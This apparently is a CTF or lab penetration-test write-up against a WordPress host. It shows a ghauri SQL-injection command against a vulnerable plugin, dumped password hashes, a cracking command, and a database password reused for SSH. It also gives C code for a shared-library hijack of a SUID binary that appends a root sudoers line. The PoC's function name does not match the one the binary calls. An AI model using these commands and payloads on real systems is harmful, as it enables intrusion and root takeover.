**IP:** `192.168.126.229`

---

## TARGET / OS & TECH
- OS/TECH: Ubuntu 13.9, WordPress, PHP

---

## USERS (from dumped `wp_users`)
| USER     | PASSWORD HASH                                |
|----------|----------------------------------------------|
| admin    | `$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.`         |
| charlie  | `$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.`         |
| ted      | `$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/`         |

---

## SERVICES (quick)
- `20/tcp` FTP-data → **closed**
- `21/tcp` FTP → **open** (vsftpd 3.0.5) — anonymous login attempt shows `anonymous:anonymous` no password needed
- `22/tcp` SSH → **open** (OpenSSH 9.6p1 Ubuntu 3ubuntu13.9)
- `80/tcp` HTTP → **open** (nginx 1.24.0) — WordPress site

---

## NMAP (relevant output)
```
PORT     STATE  SERVICE      VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp          vsftpd 3.0.5
|_banner: 220 (vsFTPd 3.0.5)
22/tcp   open   ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.9
80/tcp   open   http         nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
```

---

## WPScan / WEB VULNS
- WPScan found plugin **WP-Advanced-Search** vulnerable to **CVE-2024-9796**.
- Using `ghauri` the `wp_users` table was dumped.

**Ghauri command used**
```bash
ghauri -u "http://192.168.126.229/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?t=wp_autosuggest&f=words&l=5&type=0&e=utf-8&q=c&limit=5&timestamp=19692269759899" -D wordpress -T wp_users -C user_login,user_pass --dump
```

---

## CRACKING ATTEMPT
**John the Ripper**
```bash
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result**
```
?:chrish20
?:okadamat17
```

---

## CREDENTIALS FROM `wp-config.php`
Pulled via FTP:
```php
define( 'DB_USER', 'wpadmin' );
define( 'DB_PASSWORD', 'rU)tJnTw5*ShDt4nOx' );
```
- The DB password `rU)tJnTw5*ShDt4nOx` was tested and worked as an SSH login for user **charlie** → got shell.


## PRIVILEGE ESCALATION
- Found SUID binary: `/var/www/wordpress/wp-monitor`

**`wp-monitor` contents (excerpt)**
```
var/log/nginx/access.logError opening log file%s - - [%*[^]]] "%s %s %s" %sPOST /wp-login.php200[Warning] Possible brute force attack detected: %s
[+] Checking the logs.../home/ted/.lib/libsecurity.so[!] This can take a while...init_plugin[!] Function not found in the library!
```

- The binary attempts to load a shared object `libsecurity.so` from `/home/ted` and call `init_plugin()` which is missing.
- Approach: create a shared library providing the required function so that when the SUID binary loads it, the function runs with the binary's effective privileges.

**PoC C code (user-provided)**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init_pluging(){
        setuid(0); setgid(0);
        system("echo 'charlie ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers");
}
```

- After placing the crafted `libsecurity.so` in `/home/ted` (matching the expected symbol), running `wp-monitor` results in escalation where `charlie` can run `sudo su` → root.

*End of notes.*
